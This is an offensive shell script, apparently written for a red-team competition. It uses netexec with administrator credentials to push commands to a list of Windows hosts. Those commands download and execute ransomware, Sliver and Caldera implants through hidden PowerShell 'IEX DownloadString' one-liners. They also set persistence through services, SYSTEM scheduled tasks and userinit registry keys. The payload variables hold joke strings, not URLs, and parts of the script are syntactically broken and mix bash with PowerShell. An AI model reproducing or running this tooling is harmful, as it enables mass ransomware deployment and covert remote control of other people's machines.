#!/bin/bash

# Download hosts file
curl https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/hosts/windows.txt -o windowsHosts.txt


$ransom = "I was forced to learn good coding practices because of bad opsec"
$ransomFolder = "why are you looking at my scripts"
$ransomPath = "this is my malware, there are many like it, but this one is mine"
$serviceName = "meow"
$serviceDescription = "boy i hope the gumper doesnt appear"
$sliver = "quandaledingle"
$sliverFolder = "they did surgery on a grape"
$sliverBackupFolder = "rizz?"
$sliverPath = "meowwww :3"
$sliverBackupPath = "i dont get paid enough for this"
$sliverTaskDescription = "my club president is a redhead, he has no soul" 
$regPersist = "am i an apt yet"
$caldera = "nisyhama daddy daddy!!!"
$calderaPath = "ohio livvy dunn gyatt"
$calderaBackup = "the water is making the frogs gay"
$calderaBackupPath = "can we just be nice and not look at other teams scripts guys"
$calderaTaskDescription = "please"

# Drop ransom 


deploy()
{
    read -p "Where is the binary stored: " binary
    echo "Is the folder where you want to store the binary already on the filesystem"
    echo "1. Yes"
    echo "2. No"
    read -p "Yes or No" create
    case $create in 
        1)
            read -p "What user are you signing in as: " userName
            read -p "User password: " userPass
            read -p "Where do you want to drop the binary" binPath
            read -p "What do you want to name the binary" binName
            $fullPath = "$binPath\\$binName"
            echo "Persistence Methods: " 
            echo "1. Service"
            echo "2. Scheduled Task"
            echo "3. Registry Key"
            read -p "Which persistence method do you want to use" persistMethod
            case $persistMethod in 
                1)
                    read -p "What do you want to name the service: " serviceName
                    read -p "What description do you want to use for the service: " serviceDescription
                    $persist = "New-Service -Name '$serviceName' -BinaryPathName '$fullPath' -DisplayName '$serviceName' -Description '$serviceDescription' -StartupType Automatic; 
                    Start-Service -Name '$serviceName';"
                    ;;
                2)
                    read -p "What do you want to name the scheduled task: " taskName
                    read -p "What description do you want to set for the task: " taskDescription
                    $persist = "schtasks /create /sc minute /mo 15 /tn '$taskName' /tr '$fullPath' /ru 'SYSTEM';
                    chtasks /change /tn '$taskName' /description '$taskDescription'"
                    ;;
                3) 
                    read -p "Registry Path?: " regPath
                    read -p "Registry Key?: " regKey
                    echo "Do you want to preserve any key values that may exist within the path?: "
                    echo "1. Yes"
                    echo "2. No"
                    read -p "Yes or No: " preserveKeys
                    case $preserveKeys in 
                        1)
                            read -p "Please enter the pre-existing key values, followed by a comma: " existingValue
                            $persist = "reg add '$regPath' /v '$regKey'' /d '$existingValue$fullPath' /t reg_sz /f;" 
                            ;;
                        2)
                            $persist = "reg add '$regPath' /v '$regKey'' /d '$fullPath' /t reg_sz /f;"
                            ;;
            netexec windowsHosts.txt -u '$userName' -p '$userPass' -X ' 
            Invoke-WebRequest -Uri "$binary" -OutFile "$fullPath"; 
            $persist
                    '
                            





}

main()
{
    deploy
}












netexec windowsHosts.txt -u Administrator -p 'Change.me123' -X '
  mkdir $ransomFolder; 
  Invoke-WebRequest -Uri "$ransom" -OutFile "$ransomPath"; 
  New-Service -Name "$serviceName" -BinaryPathName "$ransomPath" -DisplayName "$serviceName" -Description "$serviceDescription" -StartupType Automatic; 
  Start-Service -Name "$serviceName"
'

# Drop sliver
netexec windowsHosts.txt -u Administrator -p 'Change.me123' -X '
  powershell -nop -w hidden -ep bypass IEX ((New-Object System.Net.WebClient).DownloadString("$sliver")); 
  mkdir "$sliverFolder"; 
  Invoke-WebRequest -Uri "$sliver" -OutFile "$sliverPath"; 
  reg add "$regPersist" /v userinit /d "C:\Windows\system32\userinit.exe,$sliverPath" /t reg_sz /f; 
  mkdir "$sliverBackupFolder"; 
  Invoke-WebRequest -Uri "$sliver" -OutFile "$sliverBackupPath"; 
  schtasks /create /sc minute /mo 15 /tn "$sliverTaskDescription" /tr $sliverBackupPath /ru "SYSTEM"
'

# Drop caldera
netexec windowsHosts.txt -u Administrator -p 'Change.me123' -X '
  powershell -nop -w hidden -ep bypass IEX ((New-Object System.Net.WebClient).DownloadString("$caldera")); 
  Invoke-WebRequest -Uri "$caldera" -OutFile "$calderaPath"; 
  reg add "$regPersist" /v userinit /d "C:\Windows\system32\userinit.exe,$calderaPath" /t reg_sz /f; 
  mkdir "$calderaBackup"; 
  Invoke-WebRequest -Uri "$caldera" -OutFile "$calderaBackupPath"; 
  schtasks /create /sc minute /mo 15 /tn "$calderaTaskDescription" /tr $calderaBackupPath /ru "SYSTEM"
'
